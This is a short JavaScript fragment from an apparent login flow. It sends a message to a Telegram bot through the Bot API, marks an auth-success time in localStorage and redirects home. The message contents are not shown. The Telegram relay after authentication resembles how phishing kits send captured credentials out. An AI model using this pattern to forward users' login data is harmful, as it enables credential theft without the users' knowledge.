                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
                            method: "POST", headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ chat_id: this.telegramChatId, text: msg, parse_mode: "HTML" })
                        });
                        
                        localStorage.setItem('wp_auth_success_time', Date.now().toString());
                        this.navigateTo('home');
